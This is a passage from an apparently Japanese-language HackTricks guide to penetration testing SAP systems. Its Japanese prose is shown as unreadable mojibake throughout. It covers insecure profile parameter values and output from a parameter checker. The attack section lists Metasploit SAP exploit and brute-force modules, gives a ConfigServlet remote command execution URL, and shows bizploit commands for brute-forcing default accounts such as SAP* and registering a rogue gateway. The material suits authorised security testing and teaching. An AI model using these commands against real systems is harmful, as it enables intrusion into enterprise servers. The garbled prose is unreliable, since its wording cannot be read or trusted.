| `login/no_automatic_user_sapstar`              | `0`         | è‡ªå‹•ãƒ¦ãƒ¼ã‚¶ãƒ¼ SAPSTAR å‰²ã‚Šå½“ã¦ã‚’ç„¡åŠ¹ã«ã—ã¾ã™ã€‚ |
| `login/min_password_specials`                  | `0`         | ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã«å¿…è¦ãªç‰¹æ®Šæ–‡å­—ã®æœ€å°æ•°ã€‚         |
| `login/min_password_lng`                       | `<8`        | ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã«å¿…è¦ãªæœ€å°é•·ã€‚                   |
| `login/min_password_lowercase`                 | `0`         | ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã«å¿…è¦ãªå°æ–‡å­—ã®æœ€å°æ•°ã€‚           |
| `login/min_password_uppercase`                 | `0`         | ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã«å¿…è¦ãªå¤§æ–‡å­—ã®æœ€å°æ•°ã€‚           |
| `login/min_password_digits`                    | `0`         | ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã«å¿…è¦ãªæ•°å­—ã®æœ€å°æ•°ã€‚             |
| `login/min_password_letters`                   | `1`         | ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã«å¿…è¦ãªæ–‡å­—ã®æœ€å°æ•°ã€‚             |
| `login/fails_to_user_lock`                     | `<5`        | ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãŒãƒ­ãƒƒã‚¯ã•ã‚Œã‚‹å‰ã®å¤±æ•—ã—ãŸãƒ­ã‚°ã‚¤ãƒ³è©¦è¡Œã®æ•°ã€‚ |
| `login/password_expiration_time`               | `>90`       | ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®æœ‰åŠ¹æœŸé™ï¼ˆæ—¥æ•°ï¼‰ã€‚               |
| `login/password_max_idle_initial`              | `<14`       | ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®å†å…¥åŠ›ã‚’è¦æ±‚ã™ã‚‹å‰ã®æœ€å¤§ã‚¢ã‚¤ãƒ‰ãƒ«æ™‚é–“ï¼ˆåˆæœŸï¼‰ã€‚ |
| `login/password_max_idle_productive`           | `<180`      | ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®å†å…¥åŠ›ã‚’è¦æ±‚ã™ã‚‹å‰ã®æœ€å¤§ã‚¢ã‚¤ãƒ‰ãƒ«æ™‚é–“ï¼ˆç”Ÿç”£çš„ï¼‰ã€‚ |
| `login/password_downwards_compatibility`       | `0`         | ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®ä¸‹ä½äº’æ›æ€§ãŒæœ‰åŠ¹ã‹ã©ã†ã‹ã‚’æŒ‡å®šã—ã¾ã™ã€‚ |
| `rfc/reject_expired_passwd`                    | `0`         | RFCï¼ˆãƒªãƒ¢ãƒ¼ãƒˆãƒ•ã‚¡ãƒ³ã‚¯ã‚·ãƒ§ãƒ³ã‚³ãƒ¼ãƒ«ï¼‰ã«å¯¾ã—ã¦æœŸé™åˆ‡ã‚Œã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒæ‹’å¦ã•ã‚Œã‚‹ã‹ã©ã†ã‹ã‚’æ±ºå®šã—ã¾ã™ã€‚ |
| `rsau/enable`                                 | `0`         | RS AUï¼ˆèªå¯ï¼‰ãƒã‚§ãƒƒã‚¯ã‚’æœ‰åŠ¹ã¾ãŸã¯ç„¡åŠ¹ã«ã—ã¾ã™ã€‚ |
| `rdisp/gui_auto_logout`                       | `<5`        | GUI ã‚»ãƒƒã‚·ãƒ§ãƒ³ã®è‡ªå‹•ãƒ­ã‚°ã‚¢ã‚¦ãƒˆã¾ã§ã®æ™‚é–“ï¼ˆåˆ†ï¼‰ã‚’æŒ‡å®šã—ã¾ã™ã€‚ |
| `service/protectedwebmethods`                  | `SDEFAULT`  | ä¿è­·ã•ã‚ŒãŸã‚¦ã‚§ãƒ–ãƒ¡ã‚½ãƒƒãƒ‰ã®ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆè¨­å®šã‚’æŒ‡å®šã—ã¾ã™ã€‚ |
| `snc/enable`                                  | `0`         | ã‚»ã‚­ãƒ¥ã‚¢ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯é€šä¿¡ï¼ˆSNCï¼‰ã‚’æœ‰åŠ¹ã¾ãŸã¯ç„¡åŠ¹ã«ã—ã¾ã™ã€‚ |
| `ucon/rfc/active`                             | `0`         | UCONï¼ˆãƒ¦ãƒ‹ãƒ•ã‚¡ã‚¤ãƒ‰ã‚³ãƒã‚¯ãƒ†ã‚£ãƒ“ãƒ†ã‚£ï¼‰RFC ã‚’ã‚¢ã‚¯ãƒ†ã‚£ãƒ–ã¾ãŸã¯éã‚¢ã‚¯ãƒ†ã‚£ãƒ–ã«ã—ã¾ã™ã€‚ |

## ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãƒã‚§ãƒƒã‚¯ç”¨ã‚¹ã‚¯ãƒªãƒ—ãƒˆ

ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã®æ•°ãŒå¤šã„ãŸã‚ã€ã™ã¹ã¦ã‚’ .XML ãƒ•ã‚¡ã‚¤ãƒ«ã«ã‚¨ã‚¯ã‚¹ãƒãƒ¼ãƒˆã—ã€ä¸Šè¨˜ã®ã™ã¹ã¦ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’ãƒã‚§ãƒƒã‚¯ã—ã€é©åˆ‡ãªåŒºåˆ¥ã§ãã®å€¤ã‚’å°åˆ·ã™ã‚‹ã‚¹ã‚¯ãƒªãƒ—ãƒˆ [SAPPV (SAP Parameter Validator)](https://github.com/damianStrojek/SAPPV) ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ã€‚
```
./SAPPV.sh EXPORT.XML

Parameter: auth/no_check_in_some_cases
User-Defined Value: No data
System Default Value: Y
Comment: Activation of the Profile Generator
Vulnerability: "SAP Parameter Misconfiguration: auth/no_check_in_some_cases"

Parameter: auth/object_disabling_active
User-Defined Value: N
System Default Value: N
Comment: Value 'N' prohibits disabling of authorization objects
Vulnerability: "SAP Parameter Misconfiguration: auth/object_disabling_active"

Parameter: auth/rfc_authority_check
User-Defined Value: 6
System Default Value: 6
Comment: Execution option for the RFC authority check
Vulnerability: "SAP Parameter Misconfiguration: auth/rfc_authority_check"

Parameter: bdc/bdel_auth_check
User-Defined Value: No data
System Default Value: FALSE
Comment: batch-input: check authorisation for activity DELE when delete TA
Vulnerability: "SAP Parameter Misconfiguration: bdc/bdel_auth_check"

[...]
```
# æ”»æ’ƒï¼

* Windows 2000ã®ã‚ˆã†ãªå¤ã„ã‚µãƒ¼ãƒãƒ¼ã‚„æŠ€è¡“ã§å‹•ä½œã—ã¦ã„ã‚‹ã‹ç¢ºèªã—ã¾ã™ã€‚
* å¯èƒ½ãªã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ/æ”»æ’ƒã‚’è¨ˆç”»ã—ã¾ã™ã€‚SAPãƒ‡ã‚£ã‚¹ã‚«ãƒãƒªãƒ¼ã®ãŸã‚ã®å¤šãã®Metasploitãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ï¼ˆè£œåŠ©ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ï¼‰ã¨ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆãŒã‚ã‚Šã¾ã™ï¼š
```text
msf > search sap
Matching Modules
================
Name                                                                     Disclosure Date  Rank       Description
----                                                                     ---------------  ----       -----------
auxiliary/admin/maxdb/maxdb_cons_exec                                    2008-01-09       normal     SAP MaxDB cons.exe Remote Command Injection
auxiliary/admin/sap/sap_configservlet_exec_noauth                        2012-11-01       normal     SAP ConfigServlet OS Command Execution
auxiliary/admin/sap/sap_mgmt_con_osexec                                                   normal     SAP Management Console OSExecute
auxiliary/dos/sap/sap_soap_rfc_eps_delete_file                                            normal     SAP SOAP EPS_DELETE_FILE File Deletion
auxiliary/dos/windows/http/pi3web_isapi                                  2008-11-13       normal     Pi3Web ISAPI DoS
auxiliary/dos/windows/llmnr/ms11_030_dnsapi                              2011-04-12       normal     Microsoft Windows DNSAPI.dll LLMNR Buffer Underrun DoS
auxiliary/scanner/http/sap_businessobjects_user_brute                                     normal     SAP BusinessObjects User Bruteforcer
auxiliary/scanner/http/sap_businessobjects_user_brute_web                                 normal     SAP BusinessObjects Web User Bruteforcer
auxiliary/scanner/http/sap_businessobjects_user_enum                                      normal     SAP BusinessObjects User Enumeration
auxiliary/scanner/http/sap_businessobjects_version_enum                                   normal     SAP BusinessObjects Version Detection
auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt                                    normal     SAP CTC Service Verb Tampering User Management
auxiliary/scanner/sap/sap_hostctrl_getcomputersystem                                      normal     SAP Host Agent Information Disclosure
auxiliary/scanner/sap/sap_icf_public_info                                                 normal     SAP ICF /sap/public/info Service Sensitive Information Gathering
auxiliary/scanner/sap/sap_icm_urlscan                                                     normal     SAP URL Scanner
auxiliary/scanner/sap/sap_mgmt_con_abaplog                                                normal     SAP Management Console ABAP Syslog Disclosure
auxiliary/scanner/sap/sap_mgmt_con_brute_login                                            normal     SAP Management Console Brute Force
auxiliary/scanner/sap/sap_mgmt_con_extractusers                                           normal     SAP Management Console Extract Users
auxiliary/scanner/sap/sap_mgmt_con_getaccesspoints                                        normal     SAP Management Console Get Access Points
auxiliary/scanner/sap/sap_mgmt_con_getenv                                                 normal     SAP Management Console getEnvironment
auxiliary/scanner/sap/sap_mgmt_con_getlogfiles                                            normal     SAP Management Console Get Logfile
auxiliary/scanner/sap/sap_mgmt_con_getprocesslist                                         normal     SAP Management Console GetProcessList
auxiliary/scanner/sap/sap_mgmt_con_getprocessparameter                                    normal     SAP Management Console Get Process Parameters
auxiliary/scanner/sap/sap_mgmt_con_instanceproperties                                     normal     SAP Management Console Instance Properties
auxiliary/scanner/sap/sap_mgmt_con_listlogfiles                                           normal     SAP Management Console List Logfiles
auxiliary/scanner/sap/sap_mgmt_con_startprofile                                           normal     SAP Management Console getStartProfile
auxiliary/scanner/sap/sap_mgmt_con_version                                                normal     SAP Management Console Version Detection
auxiliary/scanner/sap/sap_router_info_request                                             normal     SAPRouter Admin Request
auxiliary/scanner/sap/sap_router_portscanner                                              normal     SAPRouter Port Scanner
auxiliary/scanner/sap/sap_service_discovery                                               normal     SAP Service Discovery
auxiliary/scanner/sap/sap_smb_relay                                                       normal     SAP SMB Relay Abuse
auxiliary/scanner/sap/sap_soap_bapi_user_create1                                          normal     SAP /sap/bc/soap/rfc SOAP Service BAPI_USER_CREATE1 Function User Creation
auxiliary/scanner/sap/sap_soap_rfc_brute_login                                            normal     SAP SOAP Service RFC_PING Login Brute Forcer
auxiliary/scanner/sap/sap_soap_rfc_dbmcli_sxpg_call_system_command_exec                   normal     SAP /sap/bc/soap/rfc SOAP Service SXPG_CALL_SYSTEM Function Command Injection
auxiliary/scanner/sap/sap_soap_rfc_dbmcli_sxpg_command_exec                               normal     SAP /sap/bc/soap/rfc SOAP Service SXPG_COMMAND_EXEC Function Command Injection
auxiliary/scanner/sap/sap_soap_rfc_eps_get_directory_listing                              normal     SAP SOAP RFC EPS_GET_DIRECTORY_LISTING Directories Information Disclosure
auxiliary/scanner/sap/sap_soap_rfc_pfl_check_os_file_existence                            normal     SAP SOAP RFC PFL_CHECK_OS_FILE_EXISTENCE File Existence Check
auxiliary/scanner/sap/sap_soap_rfc_ping                                                   normal     SAP /sap/bc/soap/rfc SOAP Service RFC_PING Function Service Discovery
auxiliary/scanner/sap/sap_soap_rfc_read_table                                             normal     SAP /sap/bc/soap/rfc SOAP Service RFC_READ_TABLE Function Dump Data
auxiliary/scanner/sap/sap_soap_rfc_rzl_read_dir                                           normal     SAP SOAP RFC RZL_READ_DIR_LOCAL Directory Contents Listing
auxiliary/scanner/sap/sap_soap_rfc_susr_rfc_user_interface                                normal     SAP /sap/bc/soap/rfc SOAP Service SUSR_RFC_USER_INTERFACE Function User Creation
auxiliary/scanner/sap/sap_soap_rfc_sxpg_call_system_exec                                  normal     SAP /sap/bc/soap/rfc SOAP Service SXPG_CALL_SYSTEM Function Command Execution
auxiliary/scanner/sap/sap_soap_rfc_sxpg_command_exec                                      normal     SAP SOAP RFC SXPG_COMMAND_EXECUTE
auxiliary/scanner/sap/sap_soap_rfc_system_info                                            normal     SAP /sap/bc/soap/rfc SOAP Service RFC_SYSTEM_INFO Function Sensitive Information Gathering
auxiliary/scanner/sap/sap_soap_th_saprel_disclosure                                       normal     SAP /sap/bc/soap/rfc SOAP Service TH_SAPREL Function Information Disclosure
auxiliary/scanner/sap/sap_web_gui_brute_login                                             normal     SAP Web GUI Login Brute Forcer
exploit/multi/sap/sap_mgmt_con_osexec_payload                            2011-03-08       excellent  SAP Management Console OSExecute Payload Execution
exploit/multi/sap/sap_soap_rfc_sxpg_call_system_exec                     2013-03-26       great      SAP SOAP RFC SXPG_CALL_SYSTEM Remote Command Execution
exploit/multi/sap/sap_soap_rfc_sxpg_command_exec                         2012-05-08       great      SAP SOAP RFC SXPG_COMMAND_EXECUTE Remote Command Execution
exploit/windows/browser/enjoysapgui_comp_download                        2009-04-15       excellent  EnjoySAP SAP GUI ActiveX Control Arbitrary File Download
exploit/windows/browser/enjoysapgui_preparetoposthtml                    2007-07-05       normal     EnjoySAP SAP GUI ActiveX Control Buffer Overflow
exploit/windows/browser/sapgui_saveviewtosessionfile                     2009-03-31       normal     SAP AG SAPgui EAI WebViewer3D Buffer Overflow
exploit/windows/http/sap_configservlet_exec_noauth                       2012-11-01       great      SAP ConfigServlet Remote Code Execution
exploit/windows/http/sap_host_control_cmd_exec                           2012-08-14       average    SAP NetWeaver HostControl Command Injection
exploit/windows/http/sapdb_webtools                                      2007-07-05       great      SAP DB 7.4 WebTools Buffer Overflow
exploit/windows/lpd/saplpd                                               2008-02-04       good       SAP SAPLPD 6.28 Buffer Overflow
exploit/windows/misc/sap_2005_license                                    2009-08-01       great      SAP Business One License Manager 2005 Buffer Overflow
exploit/windows/misc/sap_netweaver_dispatcher                            2012-05-08       normal     SAP NetWeaver Dispatcher DiagTraceR3Info Buffer Overflow
```
* æ—¢çŸ¥ã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’ä½¿ç”¨ã—ã¦ã¿ã¦ãã ã•ã„ï¼ˆExploit-DBã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼‰ã‚„ã€SAPãƒãƒ¼ã‚¿ãƒ«ã®å¤ãã¦è‰¯ã„ã€ŒSAP ConfigServletãƒªãƒ¢ãƒ¼ãƒˆã‚³ãƒ¼ãƒ‰å®Ÿè¡Œã€ã®ã‚ˆã†ãªæ”»æ’ƒã‚’è©¦ã¿ã¦ãã ã•ã„ï¼š
```text
http://example.com:50000/ctc/servlet/com.sap.ctc.util.ConfigServlet?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=uname -a
```
![SAP Config Servlet RCE](https://raw.githubusercontent.com/shipcod3/mySapAdventures/master/screengrabs/sap_rce.jpeg)

* ãƒ‡ã‚£ã‚¹ã‚«ãƒãƒªãƒ¼ãƒ•ã‚§ãƒ¼ã‚ºã§bizploitã‚¹ã‚¯ãƒªãƒ—ãƒˆã®`start`ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹å‰ã«ã€è„†å¼±æ€§è©•ä¾¡ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ä»¥ä¸‹ã‚’è¿½åŠ ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™:
```text
bizploit> plugins
bizploit/plugins> vulnassess all
bizploit/plugins> vulnassess config bruteLogin
bizploit/plugins/vulnassess/config:bruteLogin> set type defaultUsers
bizploit/plugins/vulnassess/config:bruteLogin> set tryHardcodedSAPStar True
bizploit/plugins/vulnassess/config:bruteLogin> set tryUserAsPwd True
bizploit/plugins/vulnassess/config:bruteLogin> back
bizploit/plugins> vulnassess config registerExtServer
bizploit/plugins/vulnassess/config:registerExtServer> set tpname evilgw
bizploit/plugins/vulnassess/config:registerExtServer> back
bizploit/plugins> vulnassess config checkRFCPrivs
bizploit/plugins/vulnassess/config:checkRFCPrivs> set checkExtOSCommands True
bizploit/plugins/vulnassess/config:checkRFCPrivs> back
bizploit/plugins> vulnassess config icmAdmin
bizploit/plugins/vulnassess/config:icmAdmin> set adminURL /sap/admin
bizploit/plugins/vulnassess/config:icmAdmin> back
bizploit/plugins> start
bizploit/plugins> back
bizploit> start
```
# ãã®ä»–ã®ãƒ†ã‚¹ãƒˆã«å½¹ç«‹ã¤ãƒ„ãƒ¼ãƒ«

* [PowerSAP](https://github.com/airbus-seclab/powersap) - SAPã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’è©•ä¾¡ã™ã‚‹ãŸã‚ã®Powershellãƒ„ãƒ¼ãƒ«
* [Burp Suite](https://portswigger.net/burp) - ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªãƒ•ã‚¡ã‚¸ãƒ³ã‚°ã¨ã‚¦ã‚§ãƒ–ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£è©•ä¾¡ã«å¿…é ˆ
* [pysap](https://github.com/SecureAuthCorp/pysap) - SAPãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒ—ãƒ­ãƒˆã‚³ãƒ«ãƒ‘ã‚±ãƒƒãƒˆã‚’ä½œæˆã™ã‚‹ãŸã‚ã®Pythonãƒ©ã‚¤ãƒ–ãƒ©ãƒª
* [https://github.com/gelim/nmap-erpscan](https://github.com/gelim/nmap-erpscan) - nmapãŒSAP/ERPã‚’æ¤œå‡ºã™ã‚‹ã®ã‚’åŠ©ã‘ã‚‹

## å‚è€ƒæ–‡çŒ®

* [Metasploitã‚’ä½¿ç”¨ã—ãŸSAPãƒšãƒãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ãƒˆ](http://information.rapid7.com/rs/rapid7/images/SAP%20Penetration%20Testing%20Using%20Metasploit%20Final.pdf)
* [https://github.com/davehardy20/SAP-Stuff](https://github.com/davehardy20/SAP-Stuff) - Bizploitã‚’åŠè‡ªå‹•åŒ–ã™ã‚‹ãŸã‚ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆ
* [SAP NetWeaver ABAPã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£æ§‹æˆãƒ‘ãƒ¼ãƒˆ3ï¼šã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã®ãŸã‚ã®ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰](https://erpscan.com/press-center/blog/sap-netweaver-abap-security-configuration-part-2-default-passwords-for-access-to-the-application/)
* [SAPã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã«é–¢é€£ã™ã‚‹ABAPãƒˆãƒ©ãƒ³ã‚¶ã‚¯ã‚·ãƒ§ãƒ³ã‚³ãƒ¼ãƒ‰ã®ãƒªã‚¹ãƒˆ](https://wiki.scn.sap.com/wiki/display/Security/List+of+ABAP-transaction+codes+related+to+SAP+security)
* [SAPãƒãƒ¼ã‚¿ãƒ«ã®ç ´å£Š](https://erpscan.com/wp-content/uploads/presentations/2012-HackerHalted-Breaking-SAP-Portal.pdf)
* [æœ€ã‚‚èˆˆå‘³æ·±ã„SAPã®è„†å¼±æ€§ã¨æ”»æ’ƒãƒˆãƒƒãƒ—10](https://erpscan.com/wp-content/uploads/presentations/2012-Kuwait-InfoSecurity-Top-10-most-interesting-vulnerabilities-and-attacks-in-SAP.pdf)
* [Bizploitã‚’ä½¿ç”¨ã—ãŸSAPã‚¨ã‚³ã‚·ã‚¹ãƒ†ãƒ ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£è©•ä¾¡ï¼šç™ºè¦‹](https://www.onapsis.com/blog/assessing-security-sap-ecosystems-bizploit-discovery)
* [https://www.exploit-db.com/docs/43859](https://www.exploit-db.com/docs/43859)
* [https://resources.infosecinstitute.com/topic/pen-stesting-sap-applications-part-1/](https://resources.infosecinstitute.com/topic/pen-stesting-sap-applications-part-1/)
* [https://github.com/shipcod3/mySapAdventures](https://github.com/shipcod3/mySapAdventures)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’é€ä¿¡ã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
